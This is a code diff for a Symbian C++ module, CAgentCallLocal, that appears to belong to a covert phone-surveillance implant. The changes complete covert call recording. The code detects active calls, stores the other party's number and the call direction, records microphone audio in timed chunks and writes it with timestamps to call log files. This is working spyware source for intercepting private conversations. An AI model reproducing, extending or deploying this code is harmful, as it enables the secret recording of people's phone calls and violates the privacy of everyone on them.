@@ -19,7 +19,7 @@ _LIT8(KFake,"\xff\xff\xff\xff");
 _LIT(KLocal,"Local");
 
 CAgentCallLocal::CAgentCallLocal() :
-CAbstractAgent(EAgent_CallLocal),iInCall(EFalse),iRecState(ENotReady),iMicrosecInterval(400000)
+CAbstractAgent(EAgent_CallLocal),iInCall(EFalse),iRecState(ENotReady),iMicrosecInterval(600000)
 	{
 	// No implementation required
 	}
@@ -27,7 +27,7 @@ CAbstractAgent(EAgent_CallLocal),iInCall(EFalse),iRecState(ENotReady),iMicrosecI
 CAgentCallLocal::~CAgentCallLocal()
 	{
 	delete iCallMonitor;
-	//delete iTimer;
+	delete iTimer;
 	
 	if(iInputStream)
 	    {
@@ -41,6 +41,7 @@ CAgentCallLocal::~CAgentCallLocal()
 		}
 	 
 	iStreamBufferArray.ResetAndDestroy();
+	__FLOG_CLOSE;
 	}
 
 CAgentCallLocal* CAgentCallLocal::NewLC(const TDesC8& params)
@@ -60,18 +61,20 @@ CAgentCallLocal* CAgentCallLocal::NewL(const TDesC8& params)
 
 void CAgentCallLocal::ConstructL(const TDesC8& params)
 	{
+	__FLOG_OPEN("HT", "Agent_CallLocal.txt");
+	__FLOG(_L("-------------"));
 		
 	BaseConstructL(params);
 	
 	TUint8* ptr = (TUint8 *)iParams.Ptr();
 	Mem::Copy( &iBuffSize, ptr, 4);
-	iBuffSize=8000;  //TODO: just for test, delete when done 
+	iBuffSize=8000;  //we need smaller buffers 
 	ptr += 4;
 	Mem::Copy(&iCompression,ptr,4 );
 	
 	
 	iCallMonitor = CPhoneCallMonitor::NewL(*this);
-	//iTimer = CHighResTimeoutTimer::NewL(*this); //EPriorityUserInput,EPriorityHigh
+	iTimer = CHighResTimeoutTimer::NewL(*this,EPriorityHigh); //EPriorityUserInput,EPriorityHigh
 		
 	// Initial audio stream properties for input and output, 8KHz mono. 
 	// These settings could also be set/changed using method SetAudioPropertiesL() of
@@ -98,12 +101,19 @@ void CAgentCallLocal::ConstructL(const TDesC8& params)
 
 void CAgentCallLocal::StartAgentCmdL()
 	{
-	
 	//we have to check if we are in call, maybe we've been called by an event call...
 	TBuf<16>  telNumber;
 	TInt direction;
 	if(iCallMonitor->ActiveCall(direction,telNumber))
 		{
+		
+		TInt size = telNumber.Size();
+		iVoiceAdditionalData.uCalleeIdLen = size;
+		iVoiceAdditionalData.uCallerIdLen = 0;
+		if(size!=0)
+			{
+			iVoiceAdditionalData.telNum.Copy(telNumber);
+			}
 		//immediately start recording:
 		iInCall = ETrue;
 		//set additional data
@@ -112,25 +122,21 @@ void CAgentCallLocal::StartAgentCmdL()
 		TInt64 filetime = TimeUtils::GetFiletime(now);
 		iVoiceAdditionalData.highStartTime = (filetime >> 32);
 		iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
-		//TODO: add line info
 		if(direction == CTelephony::EMobileOriginated)
 			{
 			//outgoing
-			//iVoiceAdditionalData.uCalleeIdLen = ...
-			//iVoiceAdditionalData.uCallerIdLen = ...
+			iVoiceAdditionalData.uIngoing = 0;
 			}
 		else
 			{
 			//incoming
-			//iVoiceAdditionalData.uCalleeIdLen = ...
-			//iVoiceAdditionalData.uCallerIdLen = ...
+			iVoiceAdditionalData.uIngoing = 1;
 			}
 		}
 	iCallMonitor->StartListeningForEvents();
 	
 	if(iInputStream)
 	    {
-		iInputStream->Stop();
 		delete iInputStream;
 		iInputStream = NULL;
 		}
@@ -148,14 +154,13 @@ void CAgentCallLocal::StartAgentCmdL()
 void CAgentCallLocal::StopAgentCmdL()
 	{
 	
-	//iTimer->Cancel();
+	iTimer->Cancel();
 	iCallMonitor->Cancel();
 	
 	if(iInputStream)
 		{
 		iInputStream->Stop();
-		}
-	
+		}	
 	}
 
 
@@ -194,9 +199,9 @@ void CAgentCallLocal::MaiscOpenComplete(TInt aError)
         // two buffers are used, they will be used in a internal FIFO queue
         if(iInCall)
         	{
-        	//TODO: refine, start timer at less than a sec
         	iInputStream->ReadL(*iStreamBufferArray[0]);
         	iInputStream->ReadL(*iStreamBufferArray[1]);
+        	iTimer->RcsHighRes(iMicrosecInterval);
         	}
         } 
 	else
@@ -245,15 +250,14 @@ void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 				TInt64 filetime = TimeUtils::GetFiletime(now);
 				iVoiceAdditionalData.highStopTime = (filetime >> 32);
 				iVoiceAdditionalData.lowStopTime = (filetime & 0xFFFFFFFF);
+				
 				//we have to write log
-				//if(!iBelowFreespaceQuota)
-					//{
-					CLogFile* logFile = CLogFile::NewLC(iFs);
-					logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
-					logFile->AppendLogL(*iRecData);
-					logFile->CloseLogL();
-					CleanupStack::PopAndDestroy(logFile);
-					//}
+				CLogFile* logFile = CLogFile::NewLC(iFs);
+				logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
+				logFile->AppendLogL(*iRecData);
+				logFile->CloseLogL();
+				CleanupStack::PopAndDestroy(logFile);
+				
 				iVoiceAdditionalData.highStartTime = (filetime >> 32);
 				iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
 				// ...reset buffer 
@@ -267,25 +271,25 @@ void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 		if(aBuffer.Length())
 			{
 			iRecData->Des().Append(aBuffer);
-						
-			TTime now;
-			now.UniversalTime();
-			TInt64 filetime = TimeUtils::GetFiletime(now);
-			iVoiceAdditionalData.highStopTime = (filetime >> 32);
-			iVoiceAdditionalData.lowStopTime = (filetime & 0xFFFFFFFF);
+			if(((iRecData->Size()+aBuffer.Size()) > iBuffSize) || (iInCall == EFalse))
+				{
+				TTime now;
+				now.UniversalTime();
+				TInt64 filetime = TimeUtils::GetFiletime(now);
+				iVoiceAdditionalData.highStopTime = (filetime >> 32);
+				iVoiceAdditionalData.lowStopTime = (filetime & 0xFFFFFFFF);
 					
-			//if(!iBelowFreespaceQuota)
-				//{
 				CLogFile* logFile = CLogFile::NewLC(iFs);
 				logFile->CreateLogL(LOGTYPE_CALL, &iVoiceAdditionalData);
 				logFile->AppendLogL(*iRecData);
 				logFile->CloseLogL();
 				CleanupStack::PopAndDestroy(logFile);
-				//}
-			iVoiceAdditionalData.highStartTime = (filetime >> 32);
-			iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
+
+				iVoiceAdditionalData.highStartTime = (filetime >> 32);
+				iVoiceAdditionalData.lowStartTime = (filetime & 0xFFFFFFFF);
 						
-			iRecData->Des().Zero();
+				iRecData->Des().Zero();
+				}
 			}
 		}
     }
@@ -302,7 +306,7 @@ void CAgentCallLocal::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
  */
 void CAgentCallLocal::MaiscRecordComplete(TInt aError)
     {
-	
+	__FLOG_1(_L("MaiscRecordComplete err = %d"),aError);
 	if (aError == KErrNone) 
         {
 		// normal stream closure after a stop and maiscbuffercopied
@@ -310,20 +314,18 @@ void CAgentCallLocal::MaiscRecordComplete(TInt aError)
 		}
     else if(aError == KErrCancel || aError == KErrAbort)
     	{
-		// TODO: user selected stop
+		// user selected stop
     	// but as above this is never the case (at least on E71)... 
     	// only MaiscBufferCopied with KErrAbort
-    	// TODO: but this could be the case on N96 !!!! check
     	}
     else if(aError == KErrDied)  //KErrDied = -13
     	{
-    	//DevSound resource conflict, call is ongoing or native rec app has been opened
-    	//we have to stop and restart everything
-    	iInputStream->Stop();
+    	//DevSound resource conflict
+ 
     	}
     else //KErrUnderflow, KErrOverflow, KErrAccessDenied, 
         {
-    	iInputStream->Stop();
+    	
         } 
     }
 
@@ -379,7 +381,7 @@ void CAgentCallLocal::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDir
 			iInputStream->ReadL(*iStreamBufferArray[0]);
 			iInputStream->ReadL(*iStreamBufferArray[1]);
 			
-			//iTimer->RcsHighRes(iMicrosecInterval);
+			iTimer->RcsHighRes(iMicrosecInterval);
 				
 			}
 		}
@@ -388,7 +390,6 @@ void CAgentCallLocal::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDir
 void CAgentCallLocal::NotifyDisconnectedCallStatusL()
 	{
 	iInCall = EFalse;
-	//iTimer->Cancel();
 	iInputStream->Stop();
 	//WriteFakeLogL();
 	}
@@ -396,18 +397,17 @@ void CAgentCallLocal::NotifyDisconnectedCallStatusL()
 
 void CAgentCallLocal::NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration, const TDesC& aNumber)
 	{
-	
 	}
 
 void CAgentCallLocal::HighResTimerExpiredL(TAny* src)
 	{
-	iInputStream->Stop();
-	
-	iInputStream->ReadL(*iStreamBufferArray[0]);
-	iInputStream->ReadL(*iStreamBufferArray[1]);
-				
-	//iTimer->RcsHighRes(iMicrosecInterval);
-				
+	if(iInCall)
+		{
+		iInputStream->Stop();
+		iInputStream->ReadL(*iStreamBufferArray[0]);
+		iInputStream->ReadL(*iStreamBufferArray[1]);
+		iTimer->RcsHighRes(iMicrosecInterval);
+		}
 	}
 
 
